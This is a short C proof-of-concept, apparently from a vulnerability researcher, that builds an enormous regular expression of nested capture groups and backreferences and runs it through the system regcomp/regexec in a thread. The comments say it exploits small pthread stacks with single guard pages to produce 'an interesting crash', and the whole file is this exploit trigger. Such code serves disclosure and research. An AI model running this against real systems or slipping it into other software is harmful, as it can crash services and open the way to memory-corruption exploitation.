//ianbeer

#include <pthread.h>
#include <regex.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define DEFAULT_REG_FLAGS (REG_EXTENDED)

// pthread stacks are small and only have single guard pages.
// I would imagine most attack scenarios will have threads

void* go(void* arg){
  // on main stack: 130 for alloca crash
  // if this is a pthread, then 11 is enough to get an interesting crash hopefully (but experiment)
  unsigned int nesting_level = 11;
  size_t inner_size = nesting_level*2+10;
  char* inner = malloc(inner_size);

  memset(inner, '(', nesting_level);
  inner[nesting_level] = '\\';
  inner[nesting_level+1] = '1';
  memset(&inner[nesting_level+2], ')', nesting_level);
  inner[nesting_level*2+2] = '\x00';

  unsigned int n_captures = 0x1000;
  char* regex = malloc(n_captures * inner_size + 100);
  strcpy(regex, "f(o)o((b)a(r))");
  for (unsigned int i = 0; i < n_captures; i++) {
    strcat(regex, inner);
  }
  strcat(regex, "r\\1o|\\2f|\\3l|\\4");
  const char* match_against = "hellothar!";

  regex_t re;
  
  int err = regcomp (&re, regex, DEFAULT_REG_FLAGS);
  if (err == 0) {
    void* something = malloc(100);
    regexec (&re, match_against, 1, (regmatch_t*)something, DEFAULT_REG_FLAGS);
  }
  return NULL;
}

int main (int argc, char const** argv)
{
  pthread_t t;
  pthread_create(&t, NULL, &go, NULL);
  pthread_join(t, NULL);

  return 0;
}
